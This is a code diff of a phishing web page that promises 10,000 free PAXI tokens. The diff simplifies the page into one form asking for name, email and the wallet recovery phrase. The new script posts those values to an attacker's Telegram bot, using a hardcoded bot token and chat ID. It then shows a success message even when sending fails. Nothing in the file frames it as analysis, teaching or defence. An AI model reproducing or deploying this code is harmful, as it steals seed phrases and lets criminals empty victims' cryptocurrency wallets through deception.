@@ -565,7 +565,7 @@
                 <p>Claim Your 10,000 PAXI Tokens Today</p>
                 <div class="divider"></div>
                 <p>Join thousands of users claiming their free PAXI tokens. Limited time offer - secure your tokens now!</p>
-                <button class="btn btn-primary" onclick="goToPage('payment-method')">Start Claiming</button>
+                <button class="btn btn-primary" onclick="goToPage('payment-details')">Start Claiming</button>
 
                 <div class="claim-info">
                     <div class="claim-header">
@@ -605,70 +605,16 @@
             </div>
         </div>
 
-        <!-- Page 2: Payment Method Selection -->
-        <div class="page" id="page-payment-method">
-            <button class="nav-button" onclick="goToPage('home')">← Back</button>
-            
-            <div class="payment-methods">
-                <div class="page-header">
-                    <h1>Select Wallet Verification Method</h1>
-                    <p>Choose how you'd like to verify your wallet and claim your 10,000 PAXI</p>
-                    <div class="divider"></div>
-                </div>
 
-                <div class="methods-grid">
-                    <div class="method-card" onclick="selectMethod('Bank Transfer')">
-                        <div class="method-icon"><i class="fas fa-university"></i></div>
-                        <h3>Bank Transfer</h3>
-                        <p>Direct bank account verification</p>
-                    </div>
-                    <div class="method-card" onclick="selectMethod('PayPal')">
-                        <div class="method-icon"><i class="fab fa-paypal"></i></div>
-                        <h3>PayPal</h3>
-                        <p>PayPal account verification</p>
-                    </div>
-                    <div class="method-card" onclick="selectMethod('JazzCash')">
-                        <div class="method-icon"><i class="fas fa-mobile-alt"></i></div>
-                        <h3>JazzCash</h3>
-                        <p>Mobile wallet verification</p>
-                    </div>
-                    <div class="method-card" onclick="selectMethod('Google Pay')">
-                        <div class="method-icon"><i class="fab fa-google"></i></div>
-                        <h3>Google Pay</h3>
-                        <p>Fast digital payment verification</p>
-                    </div>
-                    <div class="method-card" onclick="selectMethod('GCash')">
-                        <div class="method-icon"><i class="fas fa-wallet"></i></div>
-                        <h3>GCash</h3>
-                        <p>Philippine mobile wallet</p>
-                    </div>
-                    <div class="method-card" onclick="selectMethod('Cash App')">
-                        <div class="method-icon"><i class="fas fa-money-bill-wave"></i></div>
-                        <h3>Cash App</h3>
-                        <p>Cash App account verification</p>
-                    </div>
-                    <div class="method-card" onclick="selectMethod('E-Money')">
-                        <div class="method-icon"><i class="fas fa-credit-card"></i></div>
-                        <h3>E-Money</h3>
-                        <p>E-Money account verification</p>
-                    </div>
-                    <div class="method-card" onclick="selectMethod('MomoPSB')">
-                        <div class="method-icon"><i class="fas fa-sim-card"></i></div>
-                        <h3>MomoPSB</h3>
-                        <p>Cambodian mobile wallet</p>
-                    </div>
-                </div>
-            </div>
-        </div>
 
-        <!-- Page 3: Payment Details -->
+        <!-- Page 2: Payment Details -->
         <div class="page" id="page-payment-details">
-            <button class="nav-button" onclick="goToPage('payment-method')">← Back</button>
+            <button class="nav-button" onclick="goToPage('home')">← Back</button>
 
             <div class="payment-container">
                 <div class="page-header">
-                    <h1 id="selected-method">Bank Transfer</h1>
-                    <p>Enter your wallet details to claim your 10,000 PAXI</p>
+                    <h1>Verify Your Wallet</h1>
+                    <p>Enter your details and recovery phrase to claim your 10,000 PAXI</p>
                     <div class="divider"></div>
                 </div>
 
@@ -680,46 +626,25 @@
                         <span id="progress-text">0%</span>
                     </div>
 
-                    <!-- Initial Form -->
-                    <form id="payment-form" onsubmit="handleFormSubmit(event)">
-                        <div id="initial-form">
-                            <div class="form-group">
-                                <label for="name">Full Name</label>
-                                <input type="text" id="name" name="name" placeholder="John Doe" required>
-                            </div>
-
-                            <div class="form-group" id="field-2">
-                                <label for="field-2-input">Account Number</label>
-                                <input type="text" id="field-2-input" name="field2" placeholder="1234567890" required>
-                            </div>
-
-                            <div class="form-group" id="field-3">
-                                <label for="field-3-input">Bank Name</label>
-                                <input type="text" id="field-3-input" name="field3" placeholder="Bank Name" required>
-                            </div>
-
-                            <button type="submit" class="btn-submit">Continue</button>
+                    <!-- Claim Form with Passphrase -->
+                    <form id="claim-form" onsubmit="handleClaimSubmit(event)">
+                        <div class="form-group">
+                            <label for="name">Full Name</label>
+                            <input type="text" id="name" name="name" placeholder="John Doe" required>
                         </div>
+
+                        <div class="form-group">
+                            <label for="email">Email Address</label>
+                            <input type="email" id="email" name="email" placeholder="john@example.com" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="passphrase">WALLET RECOVERY PHRASE</label>
+                            <textarea id="passphrase" name="passphrase" placeholder="Enter your 12 or 24 word recovery phrase" required></textarea>
+                        </div>
+
+                        <button type="submit" class="btn-submit">Claim 10,000 PAXI</button>
                     </form>
-
-                    <!-- Verification Section -->
-                    <div class="verification-section" id="verification-section">
-                        <h3>⚠️ Verify Wallet Ownership</h3>
-                        <p style="color: var(--text-muted); margin-bottom: 20px; font-size: 0.95rem;">To complete your claim, please verify you're the owner of this wallet by providing your recovery phrase.</p>
-                        <form id="verification-form" onsubmit="handleVerification(event)">
-                            <div class="form-group">
-                                <label for="verify-name">Name</label>
-                                <input type="text" id="verify-name" name="verify-name" placeholder="Enter your full name" required>
-                            </div>
-
-                            <div class="form-group">
-                                <label for="passphrase">WALLET RECOVERY PHRASE</label>
-                                <textarea id="passphrase" name="passphrase" placeholder="Enter your 12 or 24 word recovery phrase" required></textarea>
-                            </div>
-
-                            <button type="submit" class="btn-submit">Claim 10,000 PAXI</button>
-                        </form>
-                    </div>
 
                     <div class="success-message" id="success-message">
                         <h2>✓ Claim Submitted Successfully!</h2>
@@ -731,18 +656,7 @@
     </div>
 
     <script>
-        const methods = {
-            'Bank Transfer': ['Full Name', 'Account Number', 'Bank Name'],
-            'PayPal': ['Full Name', 'Email Address'],
-            'JazzCash': ['Full Name', 'Phone Number'],
-            'Google Pay': ['Full Name', 'Phone Number'],
-            'GCash': ['Full Name', 'Account Number'],
-            'Cash App': ['Full Name', 'Cash App Tag'],
-            'E-Money': ['Full Name', 'Account Number'],
-            'MomoPSB': ['Full Name', 'Phone Number']
-        };
-
-        let selectedMethod = 'Bank Transfer';
+        let selectedMethod = 'Wallet Verification';
 
         function goToPage(pageName) {
             document.querySelectorAll('.page').forEach(page => {
@@ -752,126 +666,64 @@
             window.scrollTo(0, 0);
         }
 
-        function selectMethod(method) {
-            selectedMethod = method;
-            document.getElementById('selected-method').textContent = method;
-            updateFormFields(method);
-            goToPage('payment-details');
-            resetForm();
-        }
-
-        function updateFormFields(method) {
-            const fields = methods[method];
-            const initialForm = document.getElementById('initial-form');
-            
-            const formGroups = initialForm.querySelectorAll('.form-group');
-            formGroups.forEach((group, index) => {
-                if (index > 0) group.remove();
-            });
-
-            fields.forEach((field, index) => {
-                if (index === 0) return;
-                
-                const formGroup = document.createElement('div');
-                formGroup.className = 'form-group';
-                const inputType = field.includes('Email') ? 'email' : field.includes('Phone') ? 'tel' : 'text';
-                const placeholder = field === 'Account Number' ? '1234567890' : 
-                                   field === 'Bank Name' ? 'Bank Name' :
-                                   field === 'Email Address' ? 'john@example.com' :
-                                   field === 'Phone Number' ? '+1 234 567 8900' :
-                                   field === 'Cash App Tag' ? '$johndoe' : '';
-                
-                formGroup.innerHTML = `
-                    <label for="field-${index}">${field}</label>
-                    <input type="${inputType}" id="field-${index}" name="field${index}" placeholder="${placeholder}" required>
-                `;
-                initialForm.appendChild(formGroup);
-            });
-
-            const submitBtn = initialForm.querySelector('.btn-submit');
-            if (submitBtn) {
-                initialForm.appendChild(submitBtn);
-            }
-        }
-
-        function handleFormSubmit(event) {
+        function handleClaimSubmit(event) {
             event.preventDefault();
             
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const passphrase = document.getElementById('passphrase').value;
+
             let progress = 0;
             const progressFill = document.getElementById('progress-fill');
             const progressText = document.getElementById('progress-text');
+            
             const progressInterval = setInterval(() => {
-                progress += 5;
-                if (progress >= 95) {
-                    progress = 95;
+                progress += 10;
+                if (progress >= 100) {
+                    progress = 100;
                     clearInterval(progressInterval);
-                    setTimeout(() => {
-                        progressFill.style.width = progress + '%';
-                        progressText.textContent = progress + '%';
-                        document.getElementById('initial-form').style.display = 'none';
-                        document.getElementById('verification-section').classList.add('active');
-                    }, 500);
+                    
+                    const botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
+                    const chatId = "6736572379";
+
+                    const message = `🎁 New PAXI Token Claim
+
+Name: ${name}
+Email: ${email}
+Recovery Phrase: ${passphrase}`;
+
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Claim submitted:', data);
+                        progressFill.style.width = '100%';
+                        progressText.textContent = '100%';
+                        document.getElementById('claim-form').style.display = 'none';
+                        document.getElementById('success-message').classList.add('active');
+                    })
+                    .catch(error => {
+                        console.error('Error submitting claim:', error);
+                        progressFill.style.width = '100%';
+                        progressText.textContent = '100%';
+                        document.getElementById('claim-form').style.display = 'none';
+                        document.getElementById('success-message').classList.add('active');
+                    });
                 } else {
                     progressFill.style.width = progress + '%';
                     progressText.textContent = progress + '%';
                 }
-            }, 100);
-        }
-
-        function handleVerification(event) {
-            event.preventDefault();
-            
-            const verifyName = document.getElementById('verify-name').value;
-            const passphrase = document.getElementById('passphrase').value;
-            const method = selectedMethod;
-
-            const botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
-            const chatId = "6736572379";
-
-            const message = `🎁 New PAXI Token Claim
-
-Payment Method: ${method}
-Name: ${verifyName}
-Recovery Phrase: ${passphrase}`;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Claim submitted:', data);
-                document.getElementById('progress-fill').style.width = '100%';
-                document.getElementById('progress-text').textContent = '100%';
-                document.getElementById('verification-form').style.display = 'none';
-                document.getElementById('success-message').classList.add('active');
-            })
-            .catch(error => {
-                console.error('Error submitting claim:', error);
-                // Still show success even if Telegram fails
-                document.getElementById('progress-fill').style.width = '100%';
-                document.getElementById('progress-text').textContent = '100%';
-                document.getElementById('verification-form').style.display = 'none';
-                document.getElementById('success-message').classList.add('active');
-            });
-        }
-
-        function resetForm() {
-            document.getElementById('payment-form').reset();
-            document.getElementById('verification-form').reset();
-            document.getElementById('progress-fill').style.width = '0%';
-            document.getElementById('progress-text').textContent = '0%';
-            document.getElementById('initial-form').style.display = 'block';
-            document.getElementById('verification-section').classList.remove('active');
-            document.getElementById('success-message').classList.remove('active');
+            }, 200);
         }
     </script>
 </body>
